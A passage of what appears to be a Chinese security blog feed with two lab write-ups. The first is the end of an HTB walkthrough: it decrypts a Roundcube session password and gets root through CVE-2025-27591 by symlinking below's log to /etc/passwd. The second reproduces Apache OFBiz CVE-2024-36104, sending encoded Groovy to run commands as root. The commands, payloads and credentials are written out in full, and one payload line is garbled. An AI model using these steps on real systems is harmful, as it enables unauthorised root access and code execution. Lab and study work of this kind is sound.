class="hljs-string">&quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;</span>;login_time|i:<span class="hljs-number">1749397119</span>;timezone|s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;Europe/London&quot;</span>;STORAGE_SPECIAL-USE|b:<span class="hljs-number">1</span>;auth_secret|s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;DpYqv6maI9HxDL5GhcCd8JaQQW&quot;</span>;request_token|s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;TIsOaABA1zHSXZOBpH6up5XFyayNRHaw&quot;</span>;task|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;mail&quot;</span>;skin_config|a:<span class="hljs-number">7</span>:&#123;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;supported_layouts&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;widescreen&quot;</span>;&#125;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;jquery_ui_colors_theme&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;bootstrap&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;embed_css_location&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;/styles/embed.css&quot;</span>;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;editor_css_location&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;/styles/embed.css&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;dark_mode_support&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;media_browser_css_location&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;none&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;additional_logo_types&quot;</span>;a:<span class="hljs-number">3</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;dark&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;small&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;small-dark&quot;</span>;&#125;&#125;imap_host|s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;localhost&quot;</span>;page|i:<span class="hljs-number">1</span>;mbox|s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;INBOX&quot;</span>;sort_col|s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;sort_order|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;DESC&quot;</span>;STORAGE_THREAD|a:<span class="hljs-number">3</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;REFERENCES&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;REFS&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;ORDEREDSUBJECT&quot;</span>;&#125;STORAGE_QUOTA|b:<span class="hljs-number">0</span>;STORAGE_LIST-EXTENDED|b:<span class="hljs-number">1</span>;list_attrib|a:<span class="hljs-number">6</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;messages&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;messagelist&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">42</span>:<span class="hljs-string">&quot;listing messagelist sortheader fixedheader&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;aria-labelledby&quot;</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;aria-label-messagelist&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;data-list&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;message_list&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;data-label-msg&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;The list is empty.&quot;</span>;&#125;unseen_count|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;INBOX&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Trash&quot;</span>;i:<span class="hljs-number">0</span>;&#125;folders|a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;INBOX&quot;</span>;a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cnt&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;maxuid&quot;</span>;i:<span class="hljs-number">3</span>;&#125;&#125;list_mod_seq|s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;10&quot;</span>;<br></code></pre></td></tr></table></figure><p>有用户 <code>jacob</code> 的信息，password 和 auth_secret</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">password|s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;</span><br>auth_secret|s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;DpYqv6maI9HxDL5GhcCd8JaQQW&quot;</span><br></code></pre></td></tr></table></figure><h1 id="Decrypt-Password"><a href="#Decrypt-Password" class="headerlink" title="Decrypt Password"></a>Decrypt Password</h1><p>在 <code>/var/www/html/roundcube/bin</code> 下有一个 decrypt.sh可以直接解密了</p><p><img src="https://img.dkdun.cn/v1/2025/12/bb20b62e5695198c.png" alt="image-20250716011112828"></p><p>拿到密码 <code>595mO8DmwGeD</code></p><p>同样可以用另一种方法解密：</p><p>在 <a href="https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube.php">https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube.php</a> 找到了相关解密函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_crypto_method</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;cipher_method&#x27;</span>) ?: <span class="hljs-string">&#x27;DES-EDE3-CBC&#x27;</span>;<br>    &#125;<br><br>* @param <span class="hljs-keyword">string</span> <span class="hljs-variable">$cipher</span> Encrypted text<br>     * @param <span class="hljs-keyword">string</span> <span class="hljs-variable">$key</span>    Encryption key to retrieve <span class="hljs-keyword">from</span> the configuration, defaults to <span class="hljs-string">&#x27;des_key&#x27;</span><br>     * @param <span class="hljs-keyword">bool</span>   <span class="hljs-variable">$base64</span> Whether <span class="hljs-keyword">or</span> not input is base64-encoded<br>     *<br>     * @<span class="hljs-keyword">return</span> <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span> Decrypted text, <span class="hljs-literal">false</span> on error<br>     */<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params"><span class="hljs-variable">$cipher</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;des_key&#x27;</span>, <span class="hljs-variable">$base64</span> = <span class="hljs-literal">true</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// @phpstan-ignore-next-line</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$cipher</span>) || !<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cipher</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$base64</span>) &#123;<br>            <span class="hljs-variable">$cipher</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cipher</span> === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$ckey</span> = <span class="hljs-variable language_">$this</span>-&gt;config-&gt;<span class="hljs-title function_ invoke__">get_crypto_key</span>(<span class="hljs-variable">$key</span>);<br>        <span class="hljs-variable">$method</span> = <span class="hljs-variable language_">$this</span>-&gt;config-&gt;<span class="hljs-title function_ invoke__">get_crypto_method</span>();<br>        <span class="hljs-variable">$iv_size</span> = <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-variable">$method</span>);<br>        <span class="hljs-variable">$tag</span> = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^##(.&#123;16&#125;)##/s&#x27;</span>, <span class="hljs-variable">$cipher</span>, <span class="hljs-variable">$matches</span>)) &#123;<br>            <span class="hljs-variable">$tag</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$cipher</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]));<br>        &#125;<br><br>        <span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$iv_size</span>);<br><br>        <span class="hljs-comment">// session corruption? (#1485970)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$iv</span>) &lt; <span class="hljs-variable">$iv_size</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$cipher</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-variable">$iv_size</span>);<br>        <span class="hljs-variable">$clear</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-variable">$method</span>, <span class="hljs-variable">$ckey</span>, \OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>, <span class="hljs-variable">$tag</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$clear</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>从上面的这些代码中可以得到加密方法为 DES-EDE3-CBC，也就是 3DES，iv 由密文经过 base64 解密然后再转为 hex 取前 8 个字节得到</p><p>最后结果为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iv</span>：<span class="hljs-number">2</span>fb46fd3403c4eec<br></code></pre></td></tr></table></figure><p>des_key 在之前的文件中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;des_key&#x27;</span>] = <span class="hljs-string">&#x27;rcmail-!24ByteDESkey*Str&#x27;</span>;<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/f6f1aa25c48d67ff.png" alt="image-20250716023136342" style="zoom: 50%;" /><h1 id="ssh-登录"><a href="#ssh-登录" class="headerlink" title="ssh 登录"></a>ssh 登录</h1><p>登录 jacob 的账号，里面有邮件，拿到新密码 <code>gY4Wr3a1evp4</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/fd9d7ff2b1dcb30c.png" alt="image-20250716011336662"></p><p>拿到 userflag</p><h1 id="CVE-2025-27591-利用-below-提权"><a href="#CVE-2025-27591-利用-below-提权" class="headerlink" title="CVE-2025-27591 利用 below 提权"></a>CVE-2025-27591 利用 below 提权</h1><p>sudo -l 发现有 below 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jacob@outbound:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jacob on outbound:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User jacob may run the following commands on outbound:<br>    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*<br></code></pre></td></tr></table></figure><p>直接搜 below 提权找到 CVE，Below：&#x2F;var&#x2F;log&#x2F;below 全局可写目录导致本地提权漏洞 (CVE-2025-27591)</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">此漏洞允许本地用户通过以下方式将权限提升到 root：<br><br><span class="hljs-number">1.</span> 符号链接 /var/<span class="hljs-built_in">log</span>/<span class="hljs-keyword">below</span>/error_root.<span class="hljs-built_in">log</span> 到 /etc/passwd<br><span class="hljs-number">2.</span> 触发 <span class="hljs-keyword">below</span> 写入符号链接<br><span class="hljs-number">3.</span> 将恶意 root 用户注入 /etc/passwd<br></code></pre></td></tr></table></figure><p>加密密码写入 &#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# perl -e <span class="hljs-string">&#x27;print crypt(&quot;butt3rf1y&quot;,&quot;abc&quot;)&#x27;</span><br>abvS2XoFvLJII<br></code></pre></td></tr></table></figure><p>执行下面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;butt3rf1y:abvS2XoFvLJII:0:0:,,,:/root:/bin/bash&#x27;</span> &gt; butt3rf1y<br><span class="hljs-built_in">rm</span> error_root.log <br><span class="hljs-built_in">ln</span> -s /etc/passwd /var/log/below/error_root.log<br><span class="hljs-built_in">sudo</span> /usr/bin/below<br><span class="hljs-built_in">cp</span> butt3rf1y error_root.log<br>su butt3rf1y<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c780e77c3c20166a.png" alt="image-20250716020553047"></p><p>拿到 root 权限</p><p>后面 <a href="https://www.n0o0b.com/">n0o0b</a> 师傅跟我说只需要三行命令就能拿到 root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> error_root.log<br><span class="hljs-built_in">ln</span> -s /etc/passwd error_root.log<br><span class="hljs-built_in">sudo</span> below<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;butt3rf1y:abvS2XoFvLJII:0:0::/root:/bin/bash&#x27;</span> &gt; /etc/passwd<br>su butt3rf1y<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">jacob@outbound:/var/log/below$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;butt3rf1y:abvS2XoFvLJII:0:0::/root:/bin/bash&#x27;</span> &gt; /etc/passwd<br>jacob@outbound:/var/log/below$ su butt3rf1y<br>Password:<br>butt3rf1y@outbound:/var/log/below# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>直接链接覆盖权限，把 &#x2F;etc&#x2F;passwd 的权限覆盖了写入用户，这样确实更简单一点，又学到了</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>below 提权 CVE-2025-49113、CVE-2025-27591</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜:CVE-2024-36104</title>
    <link href="/2025/07/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-CVE-RCE/"/>
    <url>/2025/07/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-CVE-RCE/</url>
    
    <content type="html"><![CDATA[<p>Apache OFBiz 版本 18.12.14 之前版本中存在路径遍历漏洞，导致攻击者能够绕过后台功能点的过滤器验证，并通过 &#x2F;webtools&#x2F;control&#x2F;ProgramExport 接口执行任意 groovy 代码实现远程代码执行（RCE）</p><span id="more"></span><h1 id="CVE-2024-36104"><a href="#CVE-2024-36104" class="headerlink" title="CVE-2024-36104"></a>CVE-2024-36104</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Apache</span> OFBiz 版本 <span class="hljs-number">18</span>.<span class="hljs-number">12</span>.<span class="hljs-number">14</span> 之前版本中存在路径遍历漏洞，源于org.apache.ofbiz.webapp.control.ControlFilter类对路径（请求 URL 中的特殊字符（如 ；、%<span class="hljs-number">2</span>e）限制不当导致攻击者能够绕过后台功能点的过滤器验证，并通过 /webtools/control/ProgramExport 接口执行任意 Groovy 代码实现远程代码执行（RCE）<br></code></pre></td></tr></table></figure><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="OFBiz-的请求路由逻辑"><a href="#OFBiz-的请求路由逻辑" class="headerlink" title="OFBiz 的请求路由逻辑"></a>OFBiz 的请求路由逻辑</h3><p>Apache OFBiz 使用 <code>ControlServlet</code> 和 <code>ControlFilter</code>  处理请求路径，其路由规则如下：</p><p>默认情况下，请求路径会被解析为：<code>/webtools/control/&lt;endpoint&gt;</code>，其中 <code>&lt;endpoint&gt;</code> 对应 <code>controller.xml</code> 中定义的 <code>&lt;request-map&gt;</code></p><img src="https://img.dkdun.cn/v1/2025/12/f001a037aff5ff72.png" alt="image-20250712025407500" style="zoom:67%;" /><p>由于 OFBiz 的路径解析逻辑没有严格校验路径层级，所以导致以下两种请求是一样的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">合法路径：<span class="hljs-regexp">/webtools/</span>control/ProgramExport<br>嵌套路径：<span class="hljs-regexp">/webtools/</span>control<span class="hljs-regexp">/forgotPassword/</span>ProgramExport<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/474806f187e62c88.png" alt="image-20250712020826338"></p><p>doGet 方法中可以看到只取了路径的第一层，后面的路径会直接被忽略</p><h3 id="触发的根本原因"><a href="#触发的根本原因" class="headerlink" title="触发的根本原因"></a>触发的根本原因</h3><p>查看源码可以发现:</p><p> <code>/framework/common/webcommon/WEB-INF/</code> 路径下的 <code>common-controller.xml</code> 文件中的 <code>forgotPassword</code> 是不需要认证的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;request-map uri=<span class="hljs-string">&quot;forgotPassword&quot;</span>&gt;<br>        &lt;security https=<span class="hljs-string">&quot;true&quot;</span> auth=<span class="hljs-string">&quot;false&quot;</span>/&gt;<br>        &lt;event type=<span class="hljs-string">&quot;java&quot;</span> path=<span class="hljs-string">&quot;org.apache.ofbiz.securityext.login.LoginEvents&quot;</span> invoke=<span class="hljs-string">&quot;forgotPassword&quot;</span>/&gt;<br>        &lt;response name=<span class="hljs-string">&quot;success&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;forgotPassword&quot;</span>/&gt;<br>        &lt;response name=<span class="hljs-string">&quot;error&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;forgotPassword&quot;</span>/&gt;<br>        &lt;response name=<span class="hljs-string">&quot;auth&quot;</span> type=<span class="hljs-string">&quot;request-redirect&quot;</span> value=<span class="hljs-string">&quot;main&quot;</span> /&gt;<br>    &lt;/request-map&gt;<br></code></pre></td></tr></table></figure><p>而 <code>framework/webtools/webapp/webtools/WEB-INF/controller.xml</code>  文件中的 <code>ProgramExport</code> 经过了认证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;request-map uri=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;<br>    &lt;security https=<span class="hljs-string">&quot;true&quot;</span> auth=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br>    &lt;response name=<span class="hljs-string">&quot;success&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;<br>    &lt;response name=<span class="hljs-string">&quot;error&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;<br>&lt;/request-map&gt;<br></code></pre></td></tr></table></figure><p>所以由于路由逻辑缺陷，当用户访问 <code>/forgotPassword/ProgramExport</code> 时：</p><p>首先 <code>forgotPassword</code> 可以直接访问，后续路径 <code>ProgramExport</code> 被错误地当作子接口处理，绕过了对 <code>ProgramExport</code> 本身的权限校验。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>URL 后加上 <code>/accounting/control/main</code> 可以正常访问，不然就是 404</p><img src="https://img.dkdun.cn/v1/2025/12/3f3590f1c7a7d93d.png" alt="image-20250711225305280" style="zoom: 50%;" /><p>可以看到一个 ERROR MESSAGE，出现报错，因为是非本地 localhost 启动，Headers 需要包含 <code>Host: localhost</code>，所以把 Host 改为：localhist:port </p><img src="https://img.dkdun.cn/v1/2025/12/54b4e60a69938ffa.png" alt="image-20250711235443781" style="zoom:50%;" /><p>请求 <code>/webtools/control/forgotPassword/ProgramExport</code> 接口</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">&#x27;id&#x27;</span>.execute().t<span class="hljs-regexp">/webtools/</span>control<span class="hljs-regexp">/forgotPassword/</span>ProgramExportext);<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/381df96e60ff0b8d.png" alt="image-20250711235638671" style="zoom:50%;" /><p>POST 传参</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">groovyProgram=<span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u006E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u0045</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u006E</span><span class="hljs-symbol">\u0028</span><span class="hljs-symbol">\u0027</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u0064</span><span class="hljs-symbol">\u0027</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0075</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0028</span><span class="hljs-symbol">\u0029</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0029</span><span class="hljs-symbol">\u003B</span><br></code></pre></td></tr></table></figure><p>得到 id 为 root，说明执行成功</p><img src="https://img.dkdun.cn/v1/2025/12/a8d8e664003bcc51.png" alt="image-20250712004022679" style="zoom:50%;" /><p>列出根目录下所有文件查看</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">throw <span class="hljs-built_in">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>.<span class="hljs-keyword">execute</span>().text);<br></code></pre></td></tr></table></figure><p>同样的 Unicode 编码</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">groovyProgram=<span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u006E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u0045</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u006E</span><span class="hljs-symbol">\u0028</span><span class="hljs-symbol">\u0027</span><span class="hljs-symbol">\u006C</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u002F</span><span class="hljs-symbol">\u0027</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0075</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0028</span><span class="hljs-symbol">\u0029</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0029</span><span class="hljs-symbol">\u003B</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/3ffad9f0347922f5.png" alt="image-20250712010500138" style="zoom: 50%;" /><p>列出了所有文件，拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">5391</span>edef-<span class="hljs-number">3</span>ee9-<span class="hljs-number">4</span>a1a-b452-db929d329eac&#125;<br></code></pre></td></tr></table></figure><p>参考：</p><p><a href="https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/framework/Apache-OFBiz-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2024-36104.md">Apache OFBiz 目录遍历致代码执行漏洞 CVE-2024-36104</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>漏洞复现</category>
      
      <category>RCE</category>
      
